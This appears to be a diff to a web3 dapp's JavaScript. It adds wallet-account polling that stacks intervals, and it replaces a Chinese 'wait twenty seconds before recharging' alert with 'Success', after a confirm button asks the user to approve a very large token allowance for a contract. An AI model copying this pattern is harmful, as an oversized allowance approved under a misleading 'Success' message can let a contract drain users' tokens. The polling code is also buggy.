@@ -176,7 +176,17 @@
         return txid
 }    
        
+function getAccounts(){
+  var accountInterval = setInterval(function() {
+         web3.eth.getAccounts(function (error, result) {
+            if (!error)
+            account = result[0];
+           // document.querySelector('#youAddress').innerHTML =  account.substring(0, 8)+'…';
+            });
 
+      }, 1000);
+
+}
   
     window.addEventListener('load', async () => {
     // Modern dapp browsers...
@@ -219,7 +229,7 @@
           $('.confirmb').on('click',function(){
 
                  getApprove('10000000000000000000000',cont_address,token_address_m).then(res => {
-                 alert("请耐心等待二十秒钟后再充值");
+                 alert("Success");
                     
                 return 5000
                 
@@ -246,7 +256,7 @@
 
 //循环执行
 setInterval(function() {
-    
+getAccounts();    
 },2000);
 
 
